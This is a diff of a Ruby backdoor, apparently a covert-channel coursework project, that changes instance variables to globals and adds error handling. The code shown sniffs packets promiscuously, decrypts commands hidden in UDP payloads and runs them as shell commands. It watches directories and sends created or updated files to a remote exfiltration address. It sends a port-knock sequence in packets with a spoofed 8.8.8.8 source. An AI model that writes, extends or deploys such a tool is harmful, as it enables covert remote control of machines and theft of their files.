@@ -54,24 +54,24 @@ FILE = "file"
 ## Functions
 
 def start_listen_server
-  puts "server listening on #{@cfg_iface}->#{@cfg_pen_protocol}:#{@cfg_pen_port}"
-  #filter = "#{@cfg_pen_protocol} and dst port #{@cfg_pen_port}"
+  puts "server listening on #{$cfg_iface}->#{$cfg_pen_protocol}:#{$cfg_pen_port}"
+  #filter = "#{$cfg_pen_protocol} and dst port #{$cfg_pen_port}"
   # ^for whatever reason this filter stopped working?
   filter = "udp"
   begin
-    cap = PacketFu::Capture.new(:iface => @cfg_iface,
+    cap = PacketFu::Capture.new(:iface => $cfg_iface,
       :start => true,
       :promic => true,
       :filter => filter)
     cap.stream.each do |p|
       threads = []
       pkt =  PacketFu::Packet.parse(p)
-      if @cfg_pen_protocol == TCP && pkt.udp_dst == @cfg_pen_port
+      if $cfg_pen_protocol == TCP && pkt.udp_dst == $cfg_pen_port
         puts "in TCP mode" #DEBUG
         #check for auth
         #if auth'd parse payload for command
         #do command
-      elsif @cfg_pen_protocol == UDP && pkt.udp_dst == @cfg_pen_port
+      elsif $cfg_pen_protocol == UDP && pkt.udp_dst == $cfg_pen_port
         puts "in UDP mode" #DEBUG
         payload = decrypt(pkt.payload)
         cmds = payload.split(' ')
@@ -86,13 +86,9 @@ def start_listen_server
           when MODE_WATCH
             puts "watch"
             if cmds[2] == DIR
-              t = Thread.new { start_watch(DIR, cmds[3]) }
-              threads.push(t)
-              threads[threads.length-1].join
+              start_watch(DIR, cmds[3])
             elsif cmds[2] == FILE
-              t = Thread.new { start_watch(FILE, cmds[3]) }
-              threads.push(t)
-              threads[threads.length-1].join
+              start_watch(FILE, cmds[3])
             end
           end
         else
@@ -117,27 +113,34 @@ def execute_shell_command(command)
 end
 
 def start_watch(type, name)
+  puts "start_watch"
   if type == DIR
     glob = '**/*'
   else
     glob = name
   end
-  FSSM.monitor('/test', glob) do
-    update { |base, relative|
-      puts "#{base}/#{relative} has been updated"
-      t = Thread.new { send_out(:file, "#{base}/#{relative}") }
-      t.join
-    }
-    delete { |base, relative|
-      puts "#{base}/#{relative} has been deleted"
-      t = Thread.new { send_out(:msg, "#{base}/#{relative}") }
-    }
-    create { |base, relative|
-      puts "#{base}/#{relative} has been created"
-      t = Thread.new { send_out(:file, "#{base}/#{relative}") }
-      t.join
-    }
-  end
+  t = Thread.new {
+    begin
+      FSSM.monitor('/test', glob) do
+        update { |base, relative|
+          puts "#{base}/#{relative} has been updated"
+          send_out(:file, "#{base}/#{relative}")
+        }
+        delete { |base, relative|
+          puts "#{base}/#{relative} has been deleted"
+          send_out(:msg, "#{base}/#{relative}")
+        }
+        create { |base, relative|
+          puts "#{base}/#{relative} has been created"
+          send_out(:file, "#{base}/#{relative}")
+        }
+      end
+    rescue Exception => e
+      puts "bad stuff in monitor"
+      puts e.message
+    end
+  }
+  t.join
   puts "watch on #{name} started"
 end
 
@@ -154,22 +157,33 @@ def send_out(mode, data)
 end
 
 def generate_knock_seq
-  iface_config = PacketFu::Config.new(PacketFu::Utils.whoami?(:iface=> @cfg_iface)).config
-  convert_config = "#{@cfg_exfil_protocol},#{@exfil_port},#{@cfg_exfil_ttl}"
+  puts "generating knock"
+  begin
+    iface_config = PacketFu::Config.new(PacketFu::Utils.whoami?(:iface=> $cfg_iface)).config
+  rescue Exception => e
+    puts "error in PF config"
+    puts e.message
+  end
+  convert_config = "#{$cfg_exfil_protocol},#{$exfil_port},#{$cfg_exfil_ttl}"
   puts convert_config
 
-  if @cfg_exfil_protocol == UDP
-    udp_packet(iface_config, 44444, convert_config)
-    sleep 2
-    udp_packet(iface_config, 44444, convert_config)
-    udp_packet(iface_config, 55555, convert_config)
-    sleep 2
-    udp_packet(iface_config, 55555, convert_config)
-    udp_packet(iface_config, 44544, convert_config)
-    sleep 2
-    udp_packet(iface_config, 44544, convert_config)
-    sleep 5
-  elsif @cfg_exfil_protocol == TCP
+  if $cfg_exfil_protocol == UDP
+    begin
+      udp_packet(iface_config, 44444, convert_config)
+      sleep 2
+      udp_packet(iface_config, 44444, convert_config)
+      udp_packet(iface_config, 55555, convert_config)
+      sleep 2
+      udp_packet(iface_config, 55555, convert_config)
+      udp_packet(iface_config, 44544, convert_config)
+      sleep 2
+      udp_packet(iface_config, 44544, convert_config)
+      sleep 5
+    rescue Exception => e
+      puts "error in udp knock"
+      puts e.message
+    end
+  elsif $cfg_exfil_protocol == TCP
   else
     #should not get here
   end
@@ -184,13 +198,13 @@ def udp_packet(config, port, payload)
   udp_pkt.udp_src = rand(0xffff)
   udp_pkt.ip_saddr = "8.8.8.8"
   #udp_pkt.ip_saddr = [rand(0xff),rand(0xff),rand(0xff),rand(0xff)].join('.')
-  udp_pkt.ip_daddr = @cfg_exfil_ip
+  udp_pkt.ip_daddr = $cfg_exfil_ip
   udp_pkt.payload = encrypt(payload)
 
   udp_pkt.recalc
-  udp_pkt.to_w(@cfg_iface)
+  udp_pkt.to_w($cfg_iface)
 
-  puts "udp packet sent #{@cfg_target_ip} on #{@cfg_pen_port}"
+  puts "udp packet sent #{$cfg_target_ip} on #{$cfg_pen_port}"
 end
 
 def tcp_packet(config, port, payload)
